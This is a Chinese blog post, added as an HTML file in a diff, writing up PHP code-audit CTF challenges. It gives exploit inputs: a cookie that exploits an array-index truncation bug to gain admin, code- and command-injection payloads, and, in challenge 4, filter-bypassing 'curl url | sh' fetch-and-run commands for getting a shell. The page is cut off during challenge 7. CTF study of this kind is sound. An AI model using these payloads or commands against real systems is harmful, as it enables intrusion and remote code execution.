@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Code-Audit-Challenges解题记录 - NoMuggle - To record my tech and my life</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="ssspallow" /><meta name="description" content="github上面的代码审计“小”题目。 代码审计和开发不同的是，代码审计需要异常关注程序语言的各种 小边界，各种开发所遗漏的语言安全特性。 这里将" /><meta name="keywords" content="security, python, node.js" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.89.4 with theme even" />
+
+
+<link rel="canonical" href="https://www.nomuggle.com/post/code-audit-challenges-solution/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.b5a744db6de49a86cadafb3b70f555ab443f83c307a483402259e94726b045ff.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Code-Audit-Challenges解题记录" />
+<meta property="og:description" content="github上面的代码审计“小”题目。 代码审计和开发不同的是，代码审计需要异常关注程序语言的各种 小边界，各种开发所遗漏的语言安全特性。 这里将" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.nomuggle.com/post/code-audit-challenges-solution/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2019-11-04T08:56:00+08:00" />
+<meta property="article:modified_time" content="2019-11-04T08:56:00+08:00" />
+
+<meta itemprop="name" content="Code-Audit-Challenges解题记录">
+<meta itemprop="description" content="github上面的代码审计“小”题目。 代码审计和开发不同的是，代码审计需要异常关注程序语言的各种 小边界，各种开发所遗漏的语言安全特性。 这里将"><meta itemprop="datePublished" content="2019-11-04T08:56:00+08:00" />
+<meta itemprop="dateModified" content="2019-11-04T08:56:00+08:00" />
+<meta itemprop="wordCount" content="3263">
+<meta itemprop="keywords" content="Security," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Code-Audit-Challenges解题记录"/>
+<meta name="twitter:description" content="github上面的代码审计“小”题目。 代码审计和开发不同的是，代码审计需要异常关注程序语言的各种 小边界，各种开发所遗漏的语言安全特性。 这里将"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">NoMuggle</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">NoMuggle</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Code-Audit-Challenges解题记录</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-11-04 </span>
+        <div class="post-category">
+            <a href="/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-1">challenge 1</a></li>
+    <li><a href="#challenge-2">challenge 2</a></li>
+    <li><a href="#challenge-3">challenge 3</a>
+      <ul>
+        <li><a href="#解法1">解法1</a></li>
+        <li><a href="#解法2">解法2</a></li>
+      </ul>
+    </li>
+    <li><a href="#challenge-4">challenge 4</a>
+      <ul>
+        <li><a href="#解法1-1">解法1</a></li>
+        <li><a href="#解法2-1">解法2</a></li>
+      </ul>
+    </li>
+    <li><a href="#challenge-5">challenge 5</a></li>
+    <li><a href="#challenge-6">challenge 6</a></li>
+    <li><a href="#challenge-7">challenge 7</a></li>
+    <li><a href="#challenge-8">challenge 8</a></li>
+    <li><a href="#challenge-9">challenge 9</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <p><a href="https://github.com/CHYbeta/Code-Audit-Challenges">github</a>上面的代码审计“小”题目。<br>
+代码审计和开发不同的是，代码审计需要异常关注程序语言的各种
+小边界，各种开发所遗漏的语言安全特性。<br>
+这里将记录我解答这些题目的思路，以加深我对各种语言安全特性的了解。</p>
+<h1 id="php">PHP</h1>
+<h2 id="challenge-1">challenge 1</h2>
+<p>题目如下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+
+/*******************************************************************
+ * PHP Challenge 2015
+ *******************************************************************
+ * Why leave all the fun to the XSS crowd?
+ *
+ * Do you know PHP?
+ * And are you up to date with all its latest peculiarities?
+ *
+ * Are you sure?
+ *
+ * If you believe you do then solve this challenge and create an
+ * input that will make the following code believe you are the ADMIN.
+ * Becoming any other user is not good enough, but a first step.
+ *
+ * Attention this code is installed on a Mac OS X 10.9 system
+ * that is running PHP 5.4.30 !!!
+ *
+ * TIPS: OS X is mentioned because OS X never runs latest PHP
+ *       Challenge will not work with latest PHP
+ *       Also challenge will only work on 64bit systems
+ *       To solve challenge you need to combine what a normal
+ *       attacker would do when he sees this code with knowledge
+ *       about latest known PHP quirks
+ *       And you cannot bruteforce the admin password directly.
+ *       To give you an idea - first half is:
+ *          orewgfpeowöfgphewoöfeiuwgöpuerhjwfiuvuger
+ *
+ * If you know the answer please submit it to info@sektioneins.de
+ ********************************************************************/
+
+$users = array(
+        &#34;0:9b5c3d2b64b8f74e56edec71462bd97a&#34; ,
+        &#34;1:4eb5fb1501102508a86971773849d266&#34;,
+        &#34;2:facabd94d57fc9f1e655ef9ce891e86e&#34;,
+        &#34;3:ce3924f011fe323df3a6a95222b0c909&#34;,
+        &#34;4:7f6618422e6a7ca2e939bd83abde402c&#34;,
+        &#34;5:06e2b745f3124f7d670f78eabaa94809&#34;,
+        &#34;6:8e39a6e40900bb0824a8e150c0d0d59f&#34;,
+        &#34;7:d035e1a80bbb377ce1edce42728849f2&#34;,
+        &#34;8:0927d64a71a9d0078c274fc5f4f10821&#34;,
+        &#34;9:e2e23d64a642ee82c7a270c6c76df142&#34;,
+        &#34;10:70298593dd7ada576aff61b6750b9118&#34;
+);
+
+$valid_user = false;
+
+$input = $_COOKIE[&#39;user&#39;];
+$input[1] = md5($input[1]);
+
+foreach ($users as $user)
+{
+        $user = explode(&#34;:&#34;, $user);
+        if ($input === $user) {
+                $uid = $input[0] + 0;
+                $valid_user = true;
+        }
+}
+
+if (!$valid_user) {
+        die(&#34;not a valid user\n&#34;);
+}
+
+if ($uid == 0) {
+
+        echo &#34;Hello Admin How can I serve you today?\n&#34;;
+        echo &#34;SECRETS ....\n&#34;;
+
+} else {
+        echo &#34;Welcome back user\n&#34;;
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>代码的意思很简单， 通过控制传入cookie的值使得最后的流程进入<code>echo &quot;Hello Admin How can I serve you today?\n&quot;;</code>
+代码块。<br>
+正常来说，我们传的cookie要是这样的: <code>Cookie: user[0]=0;user[1]=unknowpassword;</code>,user[1]的
+md5值需要跟9b5c3d2b64b8f74e56edec71462bd97a相等。 <br>
+既然是md5相关的，那上<a href="https://cmd5.com/">cmd5.com</a>查查看有没有相关记录，可惜没有。<br>
+提示也说了，admin的密码是个强密码，看来出题人不希望我们往密码爆破那方面去想。<br>
+尝试去查其他md5值，发现只有$users的第六个元素是可以查出密码的, 密码是: hund。<br>
+在比较$user和$input时，用的是<code>===</code>，那么密码比较是无法绕过的，所有最终答案的user[1]肯定等于hund,
+即<code>Cookie: user[0]=5;user[1]=hund;</code>。<br>
+然而在比较$uid和0时，用的却是<code>==</code>,或许我们可以通过php<code>==</code>的类型转换来绕过比较。<br>
+到这里我就卡住了，怎么看都绕不过，提示里说代码跑在php 5.4.30,那么这可能是只存在于这一版本php里的
+安全漏洞， 看下change log, 实在太多，找不到。看write up好了。<br>
+如write up所言， 在5.6.11之前的版本里面， php在比较数组index时犯了一个错，导致:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]); // bool(true)
+</code></pre></td></tr></table>
+</div>
+</div><p>先看下php比较数组index的实现代码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ZEND_API int zend_hash_compare(HashTable *ht1, HashTable *ht2, compare_func_t compar, zend_bool ordered TSRMLS_DC)
+{
+        Bucket *p1, *p2 = NULL;
+        int result;
+        void *pData2;
+
+        ...
+
+        while (p1) {
+                if (ordered &amp;&amp; !p2) {
+                        ...
+                }
+                if (ordered) {
+                        if (p1-&gt;nKeyLength==0 &amp;&amp; p2-&gt;nKeyLength==0) { /* numeric indices */
+                                result = p1-&gt;h - p2-&gt;h;                &lt;------------ POSSIBLE TRUNCATION
+                                if (result!=0) {
+                                        HASH_UNPROTECT_RECURSION(ht1);
+                                        HASH_UNPROTECT_RECURSION(ht2);
+                                        return result;
+                                }
+</code></pre></td></tr></table>
+</div>
+</div><p>通过两个数组index相减来判断是否index是否相等，如上， p1-&gt;h减去p2-&gt;h.<br>
+问题在于h是unsigned long类型的整数， 在64位系统上有64bit, 而相减的结果result却是32bit的int
+类型， 导致2的32次方减0的结果是0.<br>
+最后，答案已经很明显了： <code>Cookie: user[4294967296]=5;user[1]=hund;</code></p>
+<h2 id="challenge-2">challenge 2</h2>
+<p>题目:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+show_source(__FILE__);
+$flag = &#34;xxxx&#34;;
+if(isset($_GET[&#39;time&#39;])){ 
+        if(!is_numeric($_GET[&#39;time&#39;])){ 
+                echo &#39;The time must be number.&#39;; 
+        }else if($_GET[&#39;time&#39;] &lt; 60 * 60 * 24 * 30 * 2){ 
+                        echo &#39;This time is too short.&#39;; 
+        }else if($_GET[&#39;time&#39;] &gt; 60 * 60 * 24 * 30 * 3){ 
+                        echo &#39;This time is too long.&#39;; 
+        }else{ 
+                sleep((int)$_GET[&#39;time&#39;]); 
+                echo $flag; 
+        } 
+                echo &#39;&lt;hr&gt;&#39;; 
+}
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>主要考查is_numeric和(int)之间的不同, php5钟is_numeric认为十六进制的字符串也是数字，而
+(int)强制类型转换不能转换十六进制字符串, 那么答案便是<code>?time=0x76a700</code>.<br>
+注意: 从php7.0开始is_numeric不再认为二进制字符串和十六进制字符串为数字。</p>
+<h2 id="challenge-3">challenge 3</h2>
+<p>题目:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">index.php 文件内容
+
+&lt;?php
+$str = addslashes($_GET[&#39;option&#39;]);
+$file = file_get_contents(&#39;xxxxx/option.php&#39;);
+$file = preg_replace(&#39;|\$option=\&#39;.*\&#39;;|&#39;, &#34;\$option=&#39;$str&#39;;&#34;, $file);
+file_put_contents(&#39;xxxxx/option.php&#39;, $file);
+?&gt;
+
+xxxxx/option.php 文件内容
+
+$option=&#39;test&#39;;
+</code></pre></td></tr></table>
+</div>
+</div><p>这在真实情况中是有可能出现的，接受用户的信息，过滤后并把它写入到文件当中。<br>
+如果过滤不当的话很容易造成get shell.<br>
+我们看看这个， 首先对传入字符串<a href="https://www.php.net/manual/en/function.addcslashes.php">addslashes</a>, 
+例如&rsquo;会变成', 然后会正则替换option.php中$option的值。</p>
+<h3 id="解法1">解法1</h3>
+<p>首先要明白<code>'|\$option=\'.*\';|'</code> 匹配单引号内的所有内容，但是不包括换行符。那么我们的思路
+就是第一次写入一个单引号、换行符以及php代码，然后第二次把第一次的单引号注释掉，那么我们的
+php代码就逃逸出来了。<br>
+例如: 第一次访问<code>index.php?option=aaa%27%0a;phpinfo();//</code>,option.php文件内容变为:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+$option=&#39;aaa\&#39;;
+phpinfo();//&#39;;
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>此时第二次访问<code>index.php?option=aaa</code>, 文件内容变为:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+$option=&#39;aaa\&#39;;
+phpinfo();//&#39;;
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>phpinfo();已经逃逸出来了</p>
+<h3 id="解法2">解法2</h3>
+<p>preg_replace替换字符串时会再进行一次转义操作的，例如''会变成'\',所以答案为:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">index.php?option=aaa\%27%0a;phpinfo();//
+</code></pre></td></tr></table>
+</div>
+</div><p>$str的值为<code>aaa\\\'%0a;phpinfo();//</code>,经过preg_replace后变成(此处存疑，preg_replace的转义机制是怎样的？ ):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+$option=&#39;aaa\\\\&#39;;phpinfo();//&#39;;
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>phpinfo();也已经逃逸出来了</p>
+<h2 id="challenge-4">challenge 4</h2>
+<p>由于原代码和题目考察的相关度不高，就不贴代码了。<br>
+大概意思是如果你可以控制命令注入的参数，但是参数中不允许出现<code>.\/</code>三个字符，应该怎么弹shell呢？</p>
+<h3 id="解法1-1">解法1</h3>
+<p>用编码绕过:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">base64,并不是很好用,因为base64有时候会出现`/`字符
+编码: echo &#34;hello&#34; | base64 
+解码: echo &#34;aGVsbG8K&#34; | base64 -d
+
+16进制
+编码: echo &#34;hello&#34; | xxd -p
+解码: echo &#34;68656c6c6f0a&#34; | xxd -r -p
+</code></pre></td></tr></table>
+</div>
+</div><p>优缺点: 存在字符长度问题，当然如果是无法连接外网的时候，这个还是能写shell的</p>
+<h3 id="解法2-1">解法2</h3>
+<blockquote>
+<p>十进制 &mdash;||||||&gt; 十六进制 &mdash;||||||&gt; 八进制 然后在访问时 指定协议然后加个0</p>
+<p>http://0[八进制] 比如 115.239.210.26 首先用.分割数字 115 239 210 26 然后选择10进制转换16进制！
+(要用0来表示前缀，可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样！)</p>
+<p>首先把这四段数字给 转成 16 进制！</p>
+<p>结果：73 ef d2 1a  然后把 73efd21a 这十六进制一起转换成8进制！</p>
+<p>结果：16373751032</p>
+<p>然后指定协议 http:// 用0表示前缀 加上</p>
+<p>结果 链接：
+http://0016373751032</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">curl 16进制ip或八进制ip | python
+wget url | sh
+curl url | sh
+</code></pre></td></tr></table>
+</div>
+</div><p>以上都行，总之算是个小技巧吧</p>
+<h2 id="challenge-5">challenge 5</h2>
+<p>题目:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+ini_set(&#34;display_errors&#34;, &#34;On&#34;);
+error_reporting(E_ALL | E_STRICT);
+if(!isset($_GET[&#39;c&#39;])){
+   show_source(__FILE__);
+   die();
+}
+function rand_string( $length ) {
+   $chars = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;;    
+   $size = strlen( $chars );
+   $str = &#39;&#39;;
+   for( $i = 0; $i &lt; $length; $i++ ) {
+	   $str .= $chars[ rand( 0, $size - 1 ) ];
+   }
+   return $str;
+}
+$data = $_GET[&#39;c&#39;];
+$black_list = array(&#39; &#39;, &#39;!&#39;, &#39;&#34;&#39;, &#39;#&#39;, &#39;%&#39;, &#39;&amp;&#39;, &#39;*&#39;, &#39;,&#39;, &#39;-&#39;, &#39;/&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;:&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;\\&#39;, &#39;^&#39;, &#39;`&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;|&#39;, &#39;~&#39;);
+foreach ($black_list as $b) {
+   if (stripos($data, $b) !== false){
+	   die(&#34;WAF!&#34;);
+   }
+}
+$filename=rand_string(0x20).&#39;.php&#39;;
+$folder=&#39;uploads/&#39;;
+$full_filename = $folder.$filename;
+if(file_put_contents($full_filename, &#39;&lt;?php &#39;.$data)){
+   echo &#34;&lt;a href=&#39;&#34;.$full_filename.&#34;&#39;&gt;WebShell&lt;/a&gt;&lt;/br&gt;&#34;;
+   echo &#34;Enjoy your webshell~&#34;;
+}else{
+   echo &#34;Some thing wrong...&#34;;
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>大意是接受用户参数并写到php中，但是该参数中不要包括$black_list中的值， 就是不能数字，字母
+以及一些符号。 然后跟JSFUCK类似，利用php中的异或，取反和字符串自增可以构建出可执行的php函数
+和参数。具体可看<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4">一些不包含数字和字母的webshell</a>.<br>
+动态语言真是可以玩出花来。</p>
+<h2 id="challenge-6">challenge 6</h2>
+<p>题目:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+if(isset($_REQUEST[ &#39;ip&#39; ])) {
+    $target = trim($_REQUEST[ &#39;ip&#39; ]);
+    $substitutions = array(
+        &#39;&amp;&#39;  =&gt; &#39;&#39;,
+        &#39;;&#39;  =&gt; &#39;&#39;,
+        &#39;|&#39; =&gt; &#39;&#39;,
+        &#39;-&#39;  =&gt; &#39;&#39;,
+        &#39;$&#39;  =&gt; &#39;&#39;,
+        &#39;(&#39;  =&gt; &#39;&#39;,
+        &#39;)&#39;  =&gt; &#39;&#39;,
+        &#39;`&#39;  =&gt; &#39;&#39;,
+        &#39;||&#39; =&gt; &#39;&#39;,
+    );
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+    $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
+    echo $target;
+    echo  &#34;&lt;pre&gt;{$cmd}&lt;/pre&gt;&#34;;
+}
+show_source(__FILE__);
+</code></pre></td></tr></table>
+</div>
+</div><p>使用换行符: %0a可绕过过滤.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">index.php?ip=127.0.0.1%0aid
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="challenge-7">challenge 7</h2>
+<p>题目:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
